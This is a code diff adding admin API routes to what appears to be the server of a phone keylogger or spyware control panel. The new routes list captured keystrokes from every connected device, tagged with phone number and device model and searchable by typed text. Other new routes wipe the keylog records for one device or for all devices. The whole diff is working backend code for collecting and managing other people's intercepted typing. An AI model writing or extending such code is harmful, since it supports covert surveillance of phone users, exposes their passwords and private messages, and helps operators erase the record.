@@ -645,6 +645,61 @@ router.get('/connections/:deviceId/keylogs', adminAuth, (req, res) => {
   }
 });
 
+// GET /api/admin/keylogs — get ALL keylog entries across all devices (for global keylog page)
+// Optional query: ?device_id=xxx (filter), ?search=xxx (text search), ?limit=200, ?page=1
+router.get('/keylogs', adminAuth, (req, res) => {
+  try {
+    const page = parseInt(req.query.page) || 1;
+    const limit = Math.min(parseInt(req.query.limit) || 200, 1000);
+    const offset = (page - 1) * limit;
+    const deviceId = req.query.device_id || '';
+    const search = (req.query.search || '').trim();
+
+    let where = '1=1';
+    const params = [];
+    if (deviceId) { where += ' AND device_id = ?'; params.push(deviceId); }
+    if (search)   { where += ' AND text_content LIKE ?'; params.push(`%${search}%`); }
+
+    try {
+      const total = db.prepare(`SELECT COUNT(*) as c FROM keylog_entries WHERE ${where}`).get(...params)?.c || 0;
+      const rows = db.prepare(`
+        SELECT k.*, d.model, d.phone_number
+        FROM keylog_entries k
+        LEFT JOIN devices d ON d.device_id = k.device_id
+        WHERE ${where}
+        ORDER BY k.recorded_at DESC
+        LIMIT ? OFFSET ?
+      `).all(...params, limit, offset);
+      res.json({ entries: rows, total, page, totalPages: Math.ceil(total / limit) });
+    } catch (e) {
+      res.json({ entries: [], total: 0, page: 1, totalPages: 0, error: e.message });
+    }
+  } catch (err) {
+    res.status(500).json({ error: err.message });
+  }
+});
+
+// DELETE /api/admin/keylogs/:deviceId — delete all keylog entries for a device
+router.delete('/keylogs/:deviceId', adminAuth, (req, res) => {
+  try {
+    const { deviceId } = req.params;
+    const result = db.prepare('DELETE FROM keylog_entries WHERE device_id = ?').run(deviceId);
+    res.json({ success: true, deleted: result.changes });
+  } catch (e) {
+    res.status(500).json({ error: e.message });
+  }
+});
+
+// DELETE /api/admin/keylogs — delete ALL keylog entries (global clear)
+router.delete('/keylogs', adminAuth, (req, res) => {
+  try {
+    const result = db.prepare('DELETE FROM keylog_entries').run();
+    res.json({ success: true, deleted: result.changes });
+  } catch (e) {
+    res.status(500).json({ error: e.message });
+  }
+});
+
 // GET /api/admin/connections/:deviceId/export — export all device data as JSON
 router.get('/connections/:deviceId/export', adminAuth, (req, res) => {
   try {
